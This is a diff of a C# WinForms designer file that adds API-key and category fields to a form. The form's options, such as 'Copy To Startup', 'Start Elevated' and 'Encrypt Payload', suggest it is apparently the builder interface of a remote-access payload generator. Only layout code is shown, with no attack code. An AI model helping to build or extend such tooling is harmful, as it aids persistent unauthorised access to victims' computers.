@@ -33,6 +33,7 @@
             this.groupBox1 = new System.Windows.Forms.GroupBox();
             this.txtInputToken = new System.Windows.Forms.TextBox();
             this.groupBox2 = new System.Windows.Forms.GroupBox();
+            this.cbEP = new System.Windows.Forms.CheckBox();
             this.cbDM = new System.Windows.Forms.CheckBox();
             this.cbSE = new System.Windows.Forms.CheckBox();
             this.cbCTS = new System.Windows.Forms.CheckBox();
@@ -41,7 +42,10 @@
             this.btnInstallDef = new System.Windows.Forms.Button();
             this.btnSeeDef = new System.Windows.Forms.Button();
             this.comboBoxVersions = new System.Windows.Forms.ComboBox();
-            this.cbEP = new System.Windows.Forms.CheckBox();
+            this.textBox1 = new System.Windows.Forms.TextBox();
+            this.txtGoogleAPI = new System.Windows.Forms.TextBox();
+            this.textBox3 = new System.Windows.Forms.TextBox();
+            this.txtCategorie = new System.Windows.Forms.TextBox();
             this.groupBox1.SuspendLayout();
             this.groupBox2.SuspendLayout();
             this.groupBox3.SuspendLayout();
@@ -70,11 +74,15 @@
             // 
             // groupBox1
             // 
+            this.groupBox1.Controls.Add(this.txtCategorie);
+            this.groupBox1.Controls.Add(this.textBox3);
+            this.groupBox1.Controls.Add(this.txtGoogleAPI);
+            this.groupBox1.Controls.Add(this.textBox1);
             this.groupBox1.Controls.Add(this.txtInputToken);
             this.groupBox1.Controls.Add(this.txtTextToken);
             this.groupBox1.Location = new System.Drawing.Point(12, 12);
             this.groupBox1.Name = "groupBox1";
-            this.groupBox1.Size = new System.Drawing.Size(403, 89);
+            this.groupBox1.Size = new System.Drawing.Size(403, 119);
             this.groupBox1.TabIndex = 2;
             this.groupBox1.TabStop = false;
             this.groupBox1.Text = "CONNECTION";
@@ -99,12 +107,23 @@
             this.groupBox2.TabStop = false;
             this.groupBox2.Text = "INSTALL  / PERSISTENCE";
             // 
+            // cbEP
+            // 
+            this.cbEP.AutoSize = true;
+            this.cbEP.Location = new System.Drawing.Point(6, 99);
+            this.cbEP.Name = "cbEP";
+            this.cbEP.Size = new System.Drawing.Size(128, 20);
+            this.cbEP.TabIndex = 1;
+            this.cbEP.Text = "Encrypt Payload";
+            this.cbEP.UseVisualStyleBackColor = true;
+            this.cbEP.CheckedChanged += new System.EventHandler(this.cbEP_CheckedChanged);
+            // 
             // cbDM
             // 
             this.cbDM.AutoSize = true;
             this.cbDM.Location = new System.Drawing.Point(6, 73);
             this.cbDM.Name = "cbDM";
-            this.cbDM.Size = new System.Drawing.Size(105, 20);
+            this.cbDM.Size = new System.Drawing.Size(108, 20);
             this.cbDM.TabIndex = 7;
             this.cbDM.Text = "Debug Mode";
             this.cbDM.UseVisualStyleBackColor = true;
@@ -114,7 +133,7 @@
             this.cbSE.AutoSize = true;
             this.cbSE.Location = new System.Drawing.Point(6, 47);
             this.cbSE.Name = "cbSE";
-            this.cbSE.Size = new System.Drawing.Size(110, 20);
+            this.cbSE.Size = new System.Drawing.Size(113, 20);
             this.cbSE.TabIndex = 6;
             this.cbSE.Text = "Start Elevated";
             this.cbSE.UseVisualStyleBackColor = true;
@@ -124,7 +143,7 @@
             this.cbCTS.AutoSize = true;
             this.cbCTS.Location = new System.Drawing.Point(6, 21);
             this.cbCTS.Name = "cbCTS";
-            this.cbCTS.Size = new System.Drawing.Size(123, 20);
+            this.cbCTS.Size = new System.Drawing.Size(126, 20);
             this.cbCTS.TabIndex = 0;
             this.cbCTS.Text = "Copy To Startup";
             this.cbCTS.UseVisualStyleBackColor = true;
@@ -181,16 +200,41 @@
             this.comboBoxVersions.TabIndex = 8;
             this.comboBoxVersions.SelectedIndexChanged += new System.EventHandler(this.comboBoxVersions_SelectedIndexChanged);
             // 
-            // cbEP
+            // textBox1
             // 
-            this.cbEP.AutoSize = true;
-            this.cbEP.Location = new System.Drawing.Point(6, 99);
-            this.cbEP.Name = "cbEP";
-            this.cbEP.Size = new System.Drawing.Size(125, 20);
-            this.cbEP.TabIndex = 1;
-            this.cbEP.Text = "Encrypt Payload";
-            this.cbEP.UseVisualStyleBackColor = true;
-            this.cbEP.CheckedChanged += new System.EventHandler(this.cbEP_CheckedChanged);
+            this.textBox1.BackColor = System.Drawing.SystemColors.Control;
+            this.textBox1.BorderStyle = System.Windows.Forms.BorderStyle.None;
+            this.textBox1.Location = new System.Drawing.Point(17, 48);
+            this.textBox1.Name = "textBox1";
+            this.textBox1.Size = new System.Drawing.Size(152, 15);
+            this.textBox1.TabIndex = 4;
+            this.textBox1.Text = "GOOGLE MAPS API:";
+            // 
+            // txtGoogleAPI
+            // 
+            this.txtGoogleAPI.Location = new System.Drawing.Point(175, 45);
+            this.txtGoogleAPI.Name = "txtGoogleAPI";
+            this.txtGoogleAPI.Size = new System.Drawing.Size(222, 22);
+            this.txtGoogleAPI.TabIndex = 5;
+            this.txtGoogleAPI.Text = "(Only for V1.8 and above)";
+            // 
+            // textBox3
+            // 
+            this.textBox3.BackColor = System.Drawing.SystemColors.Control;
+            this.textBox3.BorderStyle = System.Windows.Forms.BorderStyle.None;
+            this.textBox3.Location = new System.Drawing.Point(17, 78);
+            this.textBox3.Name = "textBox3";
+            this.textBox3.Size = new System.Drawing.Size(152, 15);
+            this.textBox3.TabIndex = 6;
+            this.textBox3.Text = "CATEGORIE NAME:";
+            // 
+            // txtCategorie
+            // 
+            this.txtCategorie.Location = new System.Drawing.Point(175, 75);
+            this.txtCategorie.Name = "txtCategorie";
+            this.txtCategorie.Size = new System.Drawing.Size(222, 22);
+            this.txtCategorie.TabIndex = 7;
+            this.txtCategorie.Text = "(Only for V1.8 and above)";
             // 
             // Form1
             // 
@@ -232,6 +276,10 @@
         private System.Windows.Forms.Button btnSeeDef;
         private System.Windows.Forms.ComboBox comboBoxVersions;
         private System.Windows.Forms.CheckBox cbEP;
+        private System.Windows.Forms.TextBox txtCategorie;
+        private System.Windows.Forms.TextBox textBox3;
+        private System.Windows.Forms.TextBox txtGoogleAPI;
+        private System.Windows.Forms.TextBox textBox1;
     }
 }
 
